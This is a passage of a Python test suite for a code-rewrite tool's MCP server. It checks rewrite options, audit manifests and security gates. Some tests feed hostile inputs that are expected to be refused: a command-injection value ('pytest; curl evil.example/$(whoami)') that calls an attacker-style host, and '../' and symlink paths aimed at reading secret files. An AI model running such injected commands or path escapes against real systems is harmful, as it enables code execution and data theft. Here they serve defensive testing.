    assert source.read_text(encoding="utf-8") == "lambda x, y: x + y\n"


def test_execute_rewrite_plan_json_should_restore_windows_variadic_metavar_escaping(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_plan_json(
        pattern="def $F($$ARGS): return $EXPR",
        replacement="lambda $$ARGS: $EXPR",
        lang="python",
        path=str(source),
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["total_edits"] == 1
    assert payload["edits"][0]["replacement_text"] == "lambda x, y: x + y"


def test_tg_rewrite_apply_supports_optional_verify_flag():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            verify=True,
        )

    parsed = json.loads(out)
    # audit A4: every tool envelope now carries mcp_contract_version; the native
    # apply fields are otherwise unchanged.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--verify",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_supports_optional_validation_commands(monkeypatch):
    from tensor_grep.cli import mcp_server

    # Validation commands ship default-OFF on the MCP surface (audit HIGH); this
    # test exercises the explicit opt-in path.
    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
        "validation": {
            "success": True,
            "commands": [
                {
                    "kind": "lint",
                    "command": "echo lint-ok",
                    "success": True,
                    "exit_code": 0,
                    "stdout": "lint-ok\n",
                    "stderr": "",
                },
                {
                    "kind": "test",
                    "command": "echo test-ok",
                    "success": True,
                    "exit_code": 0,
                    "stdout": "test-ok\n",
                    "stderr": "",
                },
            ],
        },
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            verify=True,
            lint_cmd="echo lint-ok",
            test_cmd="echo test-ok",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--verify",
        "--lint-cmd",
        "echo lint-ok",
        "--test-cmd",
        "echo test-ok",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_rejects_lint_cmd_without_explicit_optin(monkeypatch):
    """Audit HIGH: lint_cmd/test_cmd reach a shell (sh -c / cmd /C) in the native
    apply path. Over the MCP trust boundary (agent-steerable args) this is an RCE
    primitive, so a free-form validation command must be refused unless the operator
    explicitly opted in via TG_MCP_ALLOW_VALIDATION_COMMANDS. The shared apply
    function must never be reached when the gate rejects."""
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            lint_cmd="echo pwned",
        )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    assert parsed["error"]["retryable"] is False
    assert "TG_MCP_ALLOW_VALIDATION_COMMANDS" in parsed["error"]["message"]
    mock_apply.assert_not_called()


def test_tg_rewrite_apply_rejects_test_cmd_without_explicit_optin(monkeypatch):
    """test_cmd is gated identically to lint_cmd (same shell-exec sink)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            test_cmd="pytest; curl evil.example/$(whoami)",
        )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    mock_apply.assert_not_called()


def test_tg_rewrite_apply_allows_validation_commands_when_opted_in(monkeypatch):
    """With the explicit opt-in env flag set, validation commands pass through to
    the apply function unchanged (defense-in-depth, not a hard removal)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")

    with patch(
        "tensor_grep.cli.mcp_server.execute_rewrite_apply_json",
        return_value=("{}", 0),
    ) as mock_apply:
        mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            lint_cmd="echo lint-ok",
        )

    mock_apply.assert_called_once()
    assert mock_apply.call_args.kwargs["lint_cmd"] == "echo lint-ok"


def test_tg_rewrite_apply_supports_optional_policy_parameter(tmp_path):
    from tensor_grep.cli import mcp_server

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
            "on_failure": "warn",
        }),
        encoding="utf-8",
    )

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
        "policy_result": {
            "policy_path": str(policy_path.resolve()),
            "checks": [],
            "all_passed": True,
            "action_taken": "none",
        },
    }

    with patch(
        "tensor_grep.cli.mcp_server.execute_rewrite_apply_json",
        return_value=(json.dumps(payload), 0),
    ) as mock_execute:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            policy=str(policy_path),
        )

    parsed = json.loads(out)
    assert parsed == payload
    assert mock_execute.call_args.kwargs["policy"] == str(policy_path)


def test_tg_rewrite_apply_gates_policy_file_validation_commands(tmp_path, monkeypatch):
    """Audit HIGH (RCE): a policy FILE carrying lint_cmd bypassed the
    TG_MCP_ALLOW_VALIDATION_COMMANDS gate — the 3141 guard only checked the direct
    lint_cmd/test_cmd params, not a policy path that loads them from JSON. With the
    gate OFF the policy's lint_cmd must be refused (code=unsupported_option) BEFORE
    any command runs (load_apply_policy fails closed before native/command execution).
    """
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": "echo pwned",
            "test_cmd": None,
            "ruleset_scan": None,
            "on_failure": "warn",
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(tmp_path),
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    assert parsed["error"]["retryable"] is False


def test_tg_rewrite_apply_returns_structured_invalid_policy_error(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(tmp_path),
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_policy"
    assert parsed["error"]["details"]
    assert any(detail["field"] == "on_failure" for detail in parsed["error"]["details"])


def test_tg_rewrite_apply_supports_optional_checkpoint_flag():
    from tensor_grep.cli import mcp_server

    # M12: created_at is now normalised to ISO-8601 by the MCP layer (unix timestamps are
    # converted); use an ISO-8601 string in the native payload so the expected dict still
    # matches the parsed output after normalisation.
    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "checkpoint": {
            "checkpoint_id": "ckpt-123",
            "mode": "filesystem-snapshot",
            "root": "C:/repo",
            "created_at": "2009-02-13T23:31:30+00:00",
            "file_count": 1,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                # pass the unix-timestamp form to simulate what the native binary emits;
                # the MCP layer must convert it to ISO-8601 before returning
                stdout=json.dumps({
                    **payload,
                    "checkpoint": {**payload["checkpoint"], "created_at": "1234567890"},
                }),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            checkpoint=True,
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version and applied_edits envelope keys.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # M12: applied_edits count is stamped at the top level
    assert "applied_edits" in parsed
    assert isinstance(parsed["applied_edits"], int)
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--checkpoint",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_supports_optional_audit_manifest_flag(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    # round-5 security: audit_manifest is confined to cwd (see the round-5 confinement
    # tests below), so this test's flag-support assertion must use a cwd-confined path
    # and assert the RESOLVED absolute path is what reaches the native argv.
    cwd = tmp_path / "repo"
    cwd.mkdir()
    (
        cwd / "src"
    ).mkdir()  # path="src" must exist under cwd or the pre-confinement existence check rejects it
    monkeypatch.chdir(cwd)
    resolved_manifest = cwd / "rewrite-audit.json"

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(resolved_manifest),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": False,
            "signature_kind": None,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            audit_manifest="rewrite-audit.json",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv (mirrors resolved_manifest's own confinement).
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--audit-manifest",
        str(resolved_manifest),
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((cwd / "src").resolve()),
    ]


def test_tg_rewrite_apply_records_generated_audit_manifest_in_history_index(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    manifest_path = audit_dir / "rewrite-audit.json"
    manifest_payload = _write_audit_manifest(manifest_path, project_root=project)
    # round-5 security: audit_manifest is confined to cwd; the manifest already lives
    # under `project`, so anchor cwd there.
    monkeypatch.chdir(project)
    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(manifest_path),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": False,
            "signature_kind": None,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ),
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path=str(project),
            audit_manifest=str(manifest_path),
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    index_payload = json.loads((audit_dir / "index.json").read_text(encoding="utf-8"))
    assert index_payload["version"] == 1
    assert index_payload["manifests"] == [
        {
            "manifest_sha256": manifest_payload["manifest_sha256"],
            "kind": "rewrite-audit-manifest",
            "created_at": "2026-03-23T12:00:00Z",
            "file_path": str(manifest_path.resolve()),
            "previous_manifest_sha256": None,
        }
    ]


def test_tg_rewrite_apply_supports_optional_audit_signing_key_flag(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    # round-5 security: audit_manifest is confined to cwd, and audit_signing_key (a secret
    # READ) requires the explicit opt-in env var. Anchor cwd + opt in to exercise the
    # legitimate flag-forwarding path.
    cwd = tmp_path / "repo"
    cwd.mkdir()
    (
        cwd / "src"
    ).mkdir()  # path="src" must exist under cwd or the pre-confinement existence check rejects it
    monkeypatch.chdir(cwd)
    monkeypatch.setenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", "1")
    resolved_manifest = cwd / "rewrite-audit.json"

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(resolved_manifest),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": True,
            "signature_kind": "hmac-sha256",
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            audit_manifest="rewrite-audit.json",
            audit_signing_key="C:/repo/audit.key",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert {key: parsed[key] for key in payload} == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv (mirrors resolved_manifest's own confinement).
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--audit-manifest",
        str(resolved_manifest),
        "--audit-signing-key",
        "C:/repo/audit.key",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((cwd / "src").resolve()),
    ]


def test_tg_audit_manifest_verify_supports_signed_manifests(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    # signing_key read is gated behind an explicit opt-in (audit #81 #12).
    monkeypatch.setenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", "1")
    manifest_path = tmp_path / "rewrite-audit.json"
    signing_key_path = tmp_path / "audit.key"
    signing_key = b"top-secret"
    signing_key_path.write_bytes(signing_key)
    payload = _write_audit_manifest(manifest_path, signing_key=signing_key)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path),
        signing_key=str(signing_key_path),
    )

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-verify"
    assert parsed["manifest_sha256"] == payload["manifest_sha256"]
    assert parsed["checks"] == {
        "digest_valid": True,
        "chain_valid": True,
        "signature_valid": True,
    }
    assert parsed["valid"] is True
    assert parsed["errors"] == []


def test_tg_audit_history_matches_cli_json_schema(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import audit_manifest, mcp_server

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    first_payload = _write_audit_manifest(audit_dir / "first.json")
    _write_audit_manifest(
        audit_dir / "second.json",
        previous_manifest_sha256=str(first_payload["manifest_sha256"]),
    )

    payload = json.loads(mcp_server.tg_audit_history(str(project)))

    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-history")
    assert payload["history"] == audit_manifest.list_audit_history(project)


def test_tg_audit_history_returns_empty_array_for_empty_directory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    (project / ".tensor-grep" / "audit").mkdir(parents=True)

    payload = json.loads(mcp_server.tg_audit_history(str(project)))

    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-history")
    assert payload["history"] == []


def test_tg_audit_diff_matches_cli_json_schema(tmp_path, monkeypatch):
    from tensor_grep.cli import audit_manifest, mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    left_path = tmp_path / "left.json"
    right_path = tmp_path / "right.json"
    _write_audit_manifest(left_path)
    right_payload = _write_audit_manifest(right_path)
    right_payload["kind"] = "rewrite-plan-manifest"
    right_payload["reviewer"] = "alice"
    right_payload["files"][0]["after_sha256"] = "c" * 64
    right_payload["manifest_sha256"] = hashlib.sha256(
        _canonical_manifest_bytes(right_payload)
    ).hexdigest()
    right_path.write_text(json.dumps(right_payload, indent=2), encoding="utf-8")

    payload = json.loads(mcp_server.tg_audit_diff(str(left_path), str(right_path)))

    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-diff")
    assert payload["added"] == {"reviewer": "alice"}
    assert payload["removed"] == {}
    assert (
        payload["changed"] == audit_manifest.diff_audit_manifests(left_path, right_path)["changed"]
    )


def test_tg_audit_diff_reports_not_found(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    missing_left = tmp_path / "missing-left.json"
    missing_right = tmp_path / "missing-right.json"

    out = mcp_server.tg_audit_diff(str(missing_left), str(missing_right))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-diff"
    assert parsed["error"]["code"] == "not_found"


def test_tg_audit_diff_reports_invalid_json(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    left_path = tmp_path / "left.json"
    right_path = tmp_path / "right.json"
    _write_audit_manifest(left_path)
    right_path.write_text("{not valid json", encoding="utf-8")

    out = mcp_server.tg_audit_diff(str(left_path), str(right_path))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-diff"
    assert parsed["error"]["code"] == "invalid_json"


def test_tg_audit_manifest_verify_reports_invalid_input_for_empty_path():
    from tensor_grep.cli import mcp_server

    out = mcp_server.tg_audit_manifest_verify("")

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-verify"
    assert parsed["error"]["code"] == "invalid_input"


def test_tg_audit_manifest_verify_reports_chain_failure(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    previous_manifest_path = tmp_path / "previous-audit.json"
    _write_audit_manifest(previous_manifest_path)
    manifest_path = tmp_path / "rewrite-audit.json"
    wrong_previous = "f" * 64
    _write_audit_manifest(manifest_path, previous_manifest_sha256=wrong_previous)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path),
        previous_manifest=str(previous_manifest_path),
    )

    parsed = json.loads(out)
    assert parsed["checks"]["digest_valid"] is True
    assert parsed["checks"]["chain_valid"] is False
    assert parsed["checks"]["signature_valid"] is True
    assert parsed["valid"] is False
    assert "Previous manifest digest does not match previous_manifest_sha256." in parsed["errors"]


def test_tg_review_bundle_create_matches_bundle_schema(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server
    from tensor_grep.cli.checkpoint_store import create_checkpoint

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    (project / "src").mkdir(parents=True)
    (project / "src" / "sample.py").write_text("print('hello')\n", encoding="utf-8")
    monkeypatch.chdir(project)  # cwd = the read-path confinement anchor (audit #7)

    previous_path = audit_dir / "previous.json"
    previous_payload = _write_audit_manifest(previous_path, project_root=project)
    current_path = audit_dir / "current.json"
    _write_audit_manifest(
        current_path,
        previous_manifest_sha256=str(previous_payload["manifest_sha256"]),
        project_root=project,
    )
    scan_path = project / "scan.json"
    scan_payload = _write_scan_results(scan_path)
    checkpoint = create_checkpoint(str(project))

    out = mcp_server.tg_review_bundle_create(
        manifest_path=str(current_path),
        scan_path=str(scan_path),
        checkpoint_id=checkpoint.checkpoint_id,
        previous_manifest=str(previous_path),
    )

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "review-bundle-create"
    assert parsed["scan_results"] == scan_payload
    assert parsed["checkpoint_metadata"]["checkpoint_id"] == checkpoint.checkpoint_id
    assert parsed["diff"]["changed"]["previous_manifest_sha256"] == {
        "old": None,
        "new": previous_payload["manifest_sha256"],
    }


def test_tg_review_bundle_verify_reports_invalid_integrity(tmp_path, monkeypatch):
    from tensor_grep.cli import audit_manifest as audit_manifest_module
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    (project / "src").mkdir(parents=True)
    (project / "src" / "sample.py").write_text("print('hello')\n", encoding="utf-8")
    manifest_path = audit_dir / "current.json"
    _write_audit_manifest(manifest_path, project_root=project)
    bundle_path = tmp_path / "review-bundle.json"
    audit_manifest_module.create_review_bundle(manifest_path, output_path=bundle_path)

    tampered = json.loads(bundle_path.read_text(encoding="utf-8"))
    tampered["bundle_sha256"] = "0" * 64
    bundle_path.write_text(json.dumps(tampered, indent=2), encoding="utf-8")

    out = mcp_server.tg_review_bundle_verify(str(bundle_path))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "review-bundle-verify"
    assert parsed["checks"]["audit_manifest"]["valid"] is True
    assert parsed["bundle_integrity"]["valid"] is False
    assert parsed["valid"] is False


# round-6 security (audit #7): tg_audit_manifest_verify, tg_audit_diff,
# tg_review_bundle_create, and tg_review_bundle_verify read caller-supplied JSON paths and
# echo their contents (or content-derived diffs/checksums/fields) back into the tool
# result. Unconfined, any of those 9 read-path params (manifest_path/scan_path/
# previous_manifest x2 across the 4 tools, current_manifest, bundle_path) is an
# arbitrary-file-read/exfil primitive reachable from any MCP client (e.g.
# manifest_path=~/.config/service-account.json). Each param must now resolve inside the
# project root (cwd) -- refusing an absolute path outside it, a "../" escape, AND a
# symlink planted inside the root that resolves to a target outside it -- and the refused
# response must never contain the target file's bytes. The "in-root path still works" case
# is covered by the (now cwd-anchored) tests above: test_tg_audit_manifest_verify_
# supports_signed_manifests, test_tg_audit_diff_matches_cli_json_schema,
# test_tg_review_bundle_create_matches_bundle_schema, and test_tg_review_bundle_verify_
# reports_invalid_integrity.

_AUDIT7_SECRET_MARKER = "SECRET_MARKER_AUDIT7_EXFIL_PROBE"


def _write_audit7_secret(path, *, field: str = "kind") -> None:
    path.write_text(json.dumps({field: _AUDIT7_SECRET_MARKER}), encoding="utf-8")


def _assert_audit7_refused_no_leak(out: str) -> None:
    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_input"
    assert _AUDIT7_SECRET_MARKER not in out


def test_tg_audit_manifest_verify_refuses_manifest_path_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_audit_manifest_verify(str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_manifest_path_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_audit_manifest_verify("../secret.json")

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_manifest_path_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)
    link = proj / "link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_audit_manifest_verify(str(link))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_previous_manifest_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "rewrite-audit.json"
    _write_audit_manifest(manifest_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_audit_manifest_verify(str(manifest_path), previous_manifest=str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_previous_manifest_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "rewrite-audit.json"
    _write_audit_manifest(manifest_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path), previous_manifest="../secret.json"
    )

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_previous_manifest_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "rewrite-audit.json"
    _write_audit_manifest(manifest_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)
    link = proj / "prev-link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_audit_manifest_verify(str(manifest_path), previous_manifest=str(link))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_previous_manifest_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
